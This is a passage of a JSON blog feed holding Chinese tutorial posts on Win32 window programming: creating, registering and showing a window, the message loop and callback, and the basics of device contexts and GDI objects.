punctuation\">(</span>HBRUSH<span class=\"token punctuation\">)</span>COLOR_MENU<span class=\"token punctuation\">;</span>        <span class=\"token comment\">// 窗口的背景色    </span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>wndclass<span class=\"token punctuation\">.</span>lpfnWndProc <span class=\"token operator\">=</span> WindowProc<span class=\"token punctuation\">;</span>        <span class=\"token comment\">// 窗口过程函数 也叫回调函数   </span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>wndclass<span class=\"token punctuation\">.</span>lpszClassName <span class=\"token operator\">=</span> className<span class=\"token punctuation\">;</span>        <span class=\"token comment\">// 窗口类的名字    </span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>wndclass<span class=\"token punctuation\">.</span>hInstance <span class=\"token operator\">=</span> hInstance<span class=\"token punctuation\">;</span>        <span class=\"token comment\">// 标识该窗口所在的实例</span></pre></td></tr></table></figure><blockquote>\n<p>步骤 5：注册窗口类    (这是什么？哈哈哈，就是把结构体赋值后传参调用)</p>\n</blockquote>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">RegisterClass</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>wndclass<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><blockquote>\n<p>步骤 6：创建窗口</p>\n</blockquote>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">// 创建窗口     </span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>HWND hwnd <span class=\"token operator\">=</span> <span class=\"token function\">CreateWindow</span><span class=\"token punctuation\">(</span>     </pre></td></tr><tr><td data-num=\"3\"></td><td><pre>            className<span class=\"token punctuation\">,</span>                    <span class=\"token comment\">// 类名    </span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>            <span class=\"token function\">TEXT</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"我的第一个窗口\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>        <span class=\"token comment\">// 窗口标题    </span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>            WS_OVERLAPPEDWINDOW<span class=\"token punctuation\">,</span>          <span class=\"token comment\">// 窗口外观样式     </span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>            <span class=\"token number\">10</span><span class=\"token punctuation\">,</span>                           <span class=\"token comment\">// 相对于父窗口的 X 坐标    </span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>            <span class=\"token number\">10</span><span class=\"token punctuation\">,</span>                           <span class=\"token comment\">// 相对于父窗口的 Y 坐标    </span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>            <span class=\"token number\">600</span><span class=\"token punctuation\">,</span>                          <span class=\"token comment\">// 窗口的宽度     </span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>            <span class=\"token number\">300</span><span class=\"token punctuation\">,</span>                          <span class=\"token comment\">// 窗口的高度     </span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>            <span class=\"token constant\">NULL</span><span class=\"token punctuation\">,</span>                         <span class=\"token comment\">// 父窗口句柄，为 NULL     </span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>            <span class=\"token constant\">NULL</span><span class=\"token punctuation\">,</span>                         <span class=\"token comment\">// 菜单句柄，为 NULL     </span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>            hInstance<span class=\"token punctuation\">,</span>                    <span class=\"token comment\">// 当前应用程序的句柄     </span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>            <span class=\"token constant\">NULL</span>                          <span class=\"token comment\">// 附加数据一般为 NULL</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>hwnd <span class=\"token operator\">==</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>\tTCHAR str<span class=\"token punctuation\">[</span><span class=\"token number\">30</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span> <span class=\"token constant\">NULL</span> <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token function\">wsprintf</span><span class=\"token punctuation\">(</span>str<span class=\"token punctuation\">,</span> L<span class=\"token string\">\"%s\"</span><span class=\"token punctuation\">,</span> L<span class=\"token string\">\"HelloWin32\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> </pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token function\">OutputDebugString</span><span class=\"token punctuation\">(</span>str<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><blockquote>\n<p>步骤 7：显示窗口</p>\n</blockquote>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">// 显示窗口</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">ShowWindow</span><span class=\"token punctuation\">(</span>hwnd<span class=\"token punctuation\">,</span> SW_SHOW<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><blockquote>\n<p>步骤 8：消息循环<br />\n GetMessage 函数说明：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS9HZXRNZXNzYWdl\">https://baike.baidu.com/item/GetMessage</span></p>\n</blockquote>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>MSG msg<span class=\"token punctuation\">;</span>   </pre></td></tr><tr><td data-num=\"2\"></td><td><pre>BOOL bRet<span class=\"token punctuation\">;</span>  </pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">while</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>bRet<span class=\"token operator\">=</span><span class=\"token function\">GetMessage</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>msg<span class=\"token punctuation\">,</span>hwnd<span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token operator\">!=</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token comment\">//TranslateMessage (&amp;msg);      // 键盘消息转换为小写.</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token function\">DispatchMessage</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>msg<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>      <span class=\"token comment\">// 分发消息。将我们的消息传递给我们的回调函数处理 重要函数。此消息会将 Windows 的消息。发送给我们 定义窗口类的时候给的回调函数。这样我们就可以根据消息执行我们代码了.    </span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><blockquote>\n<p>步骤 9：回调函数<br />\n例：</p>\n</blockquote>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">/*                        </pre></td></tr><tr><td data-num=\"2\"></td><td><pre>窗口消息处理程序 窗口回调函数：            </pre></td></tr><tr><td data-num=\"3\"></td><td><pre>1、窗口回调函数处理过的消息，必须传回 0.        </pre></td></tr><tr><td data-num=\"4\"></td><td><pre>2、窗口回调不处理的消息，由 DefWindowProc 来处理.    </pre></td></tr><tr><td data-num=\"5\"></td><td><pre>*/</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\">//  函数: WndProc (HWND, UINT, WPARAM, LPARAM)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\">//</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token comment\">//  目的：处理主窗口的消息。</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token comment\">//</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token comment\">//  WM_COMMAND  - 处理应用程序菜单</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token comment\">//  WM_PAINT    - 绘制主窗口</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token comment\">//  WM_DESTROY  - 发送退出消息并返回</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>LRESULT CALLBACK <span class=\"token function\">WindowProc</span><span class=\"token punctuation\">(</span>         </pre></td></tr><tr><td data-num=\"15\"></td><td><pre>            IN HWND hwnd<span class=\"token punctuation\">,</span>     </pre></td></tr><tr><td data-num=\"16\"></td><td><pre>            IN UINT uMsg<span class=\"token punctuation\">,</span>     </pre></td></tr><tr><td data-num=\"17\"></td><td><pre>            IN WPARAM wParam<span class=\"token punctuation\">,</span>     </pre></td></tr><tr><td data-num=\"18\"></td><td><pre>            IN LPARAM lParam     </pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>\t<span class=\"token keyword\">switch</span><span class=\"token punctuation\">(</span>uMsg<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>\t\t\t<span class=\"token comment\">// 窗口消息</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>\t\t<span class=\"token keyword\">case</span> WM_COMMAND<span class=\"token operator\">:</span> <span class=\"token punctuation\">&#123;</span>                           <span class=\"token comment\">// 菜单消息类型</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>\t\t\t<span class=\"token keyword\">int</span> wmId <span class=\"token operator\">=</span> <span class=\"token function\">LOWORD</span><span class=\"token punctuation\">(</span>wParam<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>           <span class=\"token comment\">// 取低两位为菜单 ID. 根据菜单 ID 可以进行操作我们的窗口</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>\t\t\t<span class=\"token comment\">// 分析菜单选择:</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>\t\t\t<span class=\"token keyword\">switch</span> <span class=\"token punctuation\">(</span>wmId<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>\t\t\t\t<span class=\"token keyword\">case</span> IDM_EXIT<span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>\t\t\t\t\t<span class=\"token function\">DestroyWindow</span><span class=\"token punctuation\">(</span>hWnd<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>\t\t\t\t\t<span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>\t\t\t\t<span class=\"token keyword\">default</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>\t\t\t\t\t<span class=\"token keyword\">return</span> <span class=\"token function\">DefWindowProc</span><span class=\"token punctuation\">(</span>hWnd<span class=\"token punctuation\">,</span> message<span class=\"token punctuation\">,</span> wParam<span class=\"token punctuation\">,</span> lParam<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  <span class=\"token comment\">// 如果不处理。则必须调用这个函数教给默认的窗口回调处理</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>\t\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>\t\t<span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>\t\t<span class=\"token keyword\">case</span> WM_CREATE<span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>\t\t<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>\t\t\t<span class=\"token function\">DbgPrintf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"WM_CREATE %d %d\\n\"</span><span class=\"token punctuation\">,</span>wParam<span class=\"token punctuation\">,</span>lParam<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>\t\t\tCREATESTRUCT<span class=\"token operator\">*</span> createst <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>CREATESTRUCT<span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>lParam<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>\t\t\t<span class=\"token function\">DbgPrintf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"CREATESTRUCT %s\\n\"</span><span class=\"token punctuation\">,</span>createst<span class=\"token operator\">-></span>lpszClass<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>\t\t\t<span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>\t\t<span class=\"token keyword\">case</span> WM_MOVE<span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>\t\t<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>\t\t\t<span class=\"token function\">DbgPrintf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"WM_MOVE %d %d\\n\"</span><span class=\"token punctuation\">,</span>wParam<span class=\"token punctuation\">,</span>lParam<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>\t\t\tPOINTS points <span class=\"token operator\">=</span> <span class=\"token function\">MAKEPOINTS</span><span class=\"token punctuation\">(</span>lParam<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>\t\t\t<span class=\"token function\">DbgPrintf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"X Y %d %d\\n\"</span><span class=\"token punctuation\">,</span>points<span class=\"token punctuation\">.</span>x<span class=\"token punctuation\">,</span>points<span class=\"token punctuation\">.</span>y<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>\t\t\t<span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre></pre></td></tr><tr><td data-num=\"65\"></td><td><pre>\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre>\t\t</pre></td></tr><tr><td data-num=\"67\"></td><td><pre>\t\t<span class=\"token keyword\">case</span> WM_SIZE<span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre></pre></td></tr><tr><td data-num=\"69\"></td><td><pre>\t\t<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"70\"></td><td><pre></pre></td></tr><tr><td data-num=\"71\"></td><td><pre>\t\t\t<span class=\"token function\">DbgPrintf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"WM_SIZE %d %d\\n\"</span><span class=\"token punctuation\">,</span>wParam<span class=\"token punctuation\">,</span>lParam<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"72\"></td><td><pre></pre></td></tr><tr><td data-num=\"73\"></td><td><pre>\t\t\t<span class=\"token keyword\">int</span> newWidth <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">short</span><span class=\"token punctuation\">)</span> <span class=\"token function\">LOWORD</span><span class=\"token punctuation\">(</span>lParam<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"74\"></td><td><pre></pre></td></tr><tr><td data-num=\"75\"></td><td><pre>\t\t\t<span class=\"token keyword\">int</span> newHeight <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">short</span><span class=\"token punctuation\">)</span> <span class=\"token function\">HIWORD</span><span class=\"token punctuation\">(</span>lParam<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"76\"></td><td><pre></pre></td></tr><tr><td data-num=\"77\"></td><td><pre>\t\t\t<span class=\"token function\">DbgPrintf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"WM_SIZE %d %d\\n\"</span><span class=\"token punctuation\">,</span>newWidth<span class=\"token punctuation\">,</span>newHeight<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"78\"></td><td><pre></pre></td></tr><tr><td data-num=\"79\"></td><td><pre>\t\t\t<span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"80\"></td><td><pre></pre></td></tr><tr><td data-num=\"81\"></td><td><pre>\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"82\"></td><td><pre>\t\t</pre></td></tr><tr><td data-num=\"83\"></td><td><pre>\t\t<span class=\"token keyword\">case</span> WM_DESTROY<span class=\"token operator\">:</span>    <span class=\"token comment\">// 销毁</span></pre></td></tr><tr><td data-num=\"84\"></td><td><pre></pre></td></tr><tr><td data-num=\"85\"></td><td><pre>\t\t<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"86\"></td><td><pre></pre></td></tr><tr><td data-num=\"87\"></td><td><pre>\t\t\t<span class=\"token function\">DbgPrintf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"WM_DESTROY %d %d\\n\"</span><span class=\"token punctuation\">,</span>wParam<span class=\"token punctuation\">,</span>lParam<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"88\"></td><td><pre></pre></td></tr><tr><td data-num=\"89\"></td><td><pre>\t\t\t<span class=\"token function\">PostQuitMessage</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"90\"></td><td><pre></pre></td></tr><tr><td data-num=\"91\"></td><td><pre>\t\t\t<span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"92\"></td><td><pre></pre></td></tr><tr><td data-num=\"93\"></td><td><pre>\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"94\"></td><td><pre></pre></td></tr><tr><td data-num=\"95\"></td><td><pre>        <span class=\"token comment\">// 键盘消息</span></pre></td></tr><tr><td data-num=\"96\"></td><td><pre>\t\t<span class=\"token keyword\">case</span> WM_KEYUP<span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"97\"></td><td><pre></pre></td></tr><tr><td data-num=\"98\"></td><td><pre>\t\t<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"99\"></td><td><pre></pre></td></tr><tr><td data-num=\"100\"></td><td><pre>\t\t\t<span class=\"token function\">DbgPrintf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"WM_KEYUP %d %d\\n\"</span><span class=\"token punctuation\">,</span>wParam<span class=\"token punctuation\">,</span>lParam<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"101\"></td><td><pre></pre></td></tr><tr><td data-num=\"102\"></td><td><pre>\t\t\t<span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"103\"></td><td><pre></pre></td></tr><tr><td data-num=\"104\"></td><td><pre>\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"105\"></td><td><pre>\t\t</pre></td></tr><tr><td data-num=\"106\"></td><td><pre>\t\t<span class=\"token keyword\">case</span> WM_KEYDOWN<span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"107\"></td><td><pre></pre></td></tr><tr><td data-num=\"108\"></td><td><pre>\t\t<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"109\"></td><td><pre></pre></td></tr><tr><td data-num=\"110\"></td><td><pre>\t\t\t<span class=\"token function\">DbgPrintf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"WM_KEYDOWN %d %d\\n\"</span><span class=\"token punctuation\">,</span>wParam<span class=\"token punctuation\">,</span>lParam<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"111\"></td><td><pre></pre></td></tr><tr><td data-num=\"112\"></td><td><pre>\t\t\t<span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"113\"></td><td><pre></pre></td></tr><tr><td data-num=\"114\"></td><td><pre>\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"115\"></td><td><pre></pre></td></tr><tr><td data-num=\"116\"></td><td><pre>        <span class=\"token comment\">// 鼠标消息</span></pre></td></tr><tr><td data-num=\"117\"></td><td><pre>\t\t</pre></td></tr><tr><td data-num=\"118\"></td><td><pre>\t\t<span class=\"token keyword\">case</span> WM_LBUTTONDOWN<span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"119\"></td><td><pre></pre></td></tr><tr><td data-num=\"120\"></td><td><pre>\t\t<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"121\"></td><td><pre></pre></td></tr><tr><td data-num=\"122\"></td><td><pre>\t\t\t<span class=\"token function\">DbgPrintf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"WM_LBUTTONDOWN %d %d\\n\"</span><span class=\"token punctuation\">,</span>wParam<span class=\"token punctuation\">,</span>lParam<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"123\"></td><td><pre></pre></td></tr><tr><td data-num=\"124\"></td><td><pre>\t\t\tPOINTS points <span class=\"token operator\">=</span> <span class=\"token function\">MAKEPOINTS</span><span class=\"token punctuation\">(</span>lParam<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"125\"></td><td><pre></pre></td></tr><tr><td data-num=\"126\"></td><td><pre>\t\t\t<span class=\"token function\">DbgPrintf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"WM_LBUTTONDOWN %d %d\\n\"</span><span class=\"token punctuation\">,</span>points<span class=\"token punctuation\">.</span>x<span class=\"token punctuation\">,</span>points<span class=\"token punctuation\">.</span>y<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"127\"></td><td><pre></pre></td></tr><tr><td data-num=\"128\"></td><td><pre>\t\t\t<span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"129\"></td><td><pre></pre></td></tr><tr><td data-num=\"130\"></td><td><pre>\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"131\"></td><td><pre></pre></td></tr><tr><td data-num=\"132\"></td><td><pre><span class=\"token comment\">//default:</span></pre></td></tr><tr><td data-num=\"133\"></td><td><pre><span class=\"token comment\">//       return DefWindowProc (hWnd, message, wParam, lParam);// 扔给 windows 处理其他消息</span></pre></td></tr><tr><td data-num=\"134\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"135\"></td><td><pre></pre></td></tr><tr><td data-num=\"136\"></td><td><pre>\t<span class=\"token keyword\">return</span> <span class=\"token function\">DefWindowProc</span><span class=\"token punctuation\">(</span>hwnd<span class=\"token punctuation\">,</span>uMsg<span class=\"token punctuation\">,</span>wParam<span class=\"token punctuation\">,</span>lParam<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>    <span class=\"token comment\">// 扔给 windows 处理其他消息</span></pre></td></tr><tr><td data-num=\"137\"></td><td><pre></pre></td></tr><tr><td data-num=\"138\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>MFC 就是基于此封装</p>\n<h1 id=\"reference\"><a class=\"anchor\" href=\"#reference\">#</a> Reference</h1>\n<p>滴水逆向课件<br />\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vaUJpbmFyeS9wLzk1ODAyNjguaHRtbA==\"> https://www.cnblogs.com/iBinary/p/9580268.html</span><br />\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2RmZzA4MjMvYXJ0aWNsZS9kZXRhaWxzLzEwMTk2NDQyMw==\">https://blog.csdn.net/dfg0823/article/details/101964423</span><br />\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1p6MjIzMzMvYXJ0aWNsZS9kZXRhaWxzLzg5MDg0NTYy\">https://blog.csdn.net/Zz22333/article/details/89084562</span></p>\n",
            "tags": [
                "Win32",
                "窗口程序",
                "消息机制",
                "消息类型"
            ]
        },
        {
            "id": "https://self-ferry.github.io/Win%E7%AA%97%E5%8F%A3%E7%9A%84%E6%9C%AC%E8%B4%A8/",
            "url": "https://self-ferry.github.io/Win%E7%AA%97%E5%8F%A3%E7%9A%84%E6%9C%AC%E8%B4%A8/",
            "title": "Win窗口的本质",
            "date_published": "2021-07-05T12:57:58.000Z",
            "content_html": "<h1 id=\"窗口的本质\"><a class=\"anchor\" href=\"#窗口的本质\">#</a> 窗口的本质</h1>\n<p>在学习 Win32 的时候。很多操作都是窗口进行操作的。那么今天就说一下窗口的本质是什么.</p>\n<p>窗口的本质是不断绘制。是 windows 通过消息机制进行绘制的.</p>\n<p>我们知道。内存分为高低 2G 低 2G 是给应用程序使用的。高 2G 是给操作系统使用的。而我们画图形的操作都是操作系统通过底层的 win32k.sys 这个驱动来提供的.</p>\n<p>进程跟线程管理是通过 notokerner.exe 这个程序来管理的。但是三环不能使用。所以提供接口给三环。分别是 kerner32.dll 跟 user32.dll gdi.dll</p>\n<p>那么他们之间的区别是什么.</p>\n<p>1.kerner32.dll  管理进程线程跟内存的一个 dll</p>\n<p>2.user32.dll   窗口管理。图形界面管理.</p>\n<p>3.gdi.dll         自己绘制的的管理.</p>\n<p>而我们要认识一下窗口的创建。那么需要了解几个基础的只是.</p>\n<p>1. 设备对象.</p>\n<p>2.DC 设备上下文.</p>\n<p>3. 图形对象.</p>\n<h2 id=\"设备对象是什么\"><a class=\"anchor\" href=\"#设备对象是什么\">#</a> 设备对象是什么</h2>\n<p>简而言之设备对象的意思就是你要画图形要往哪里画。每一个窗口都有一个窗口句柄。而且是存放在全局窗口句柄表中的。我们可以获取一下。使用 Spy++ 获取.</p>\n<h2 id=\"dc设备上下文\"><a class=\"anchor\" href=\"#dc设备上下文\">#</a> DC 设备上下文.</h2>\n<p>DC 设备上下文其实就是这个窗口有一块内存是绘制用的。我们想要往这个窗口绘制。需要先绘制到这个内存中才可以。这块内存就称为 DC 上下文.</p>\n<h2 id=\"图形对象\"><a class=\"anchor\" href=\"#图形对象\">#</a> 图形对象.</h2>\n<p>图形对象就是指画笔 画刷 位图。等等这些对象。因为我们要往内存中画的时候。可以画默认的。但是一般我们想改变一下形式。所以创建图形对象跟 DC 相关联。那么我们绘制就可以使用图形对象了.</p>\n<h1 id=\"绘制窗口步骤\"><a class=\"anchor\" href=\"#绘制窗口步骤\">#</a> 绘制窗口步骤</h1>\n<p>绘制窗口免不了使用 API. 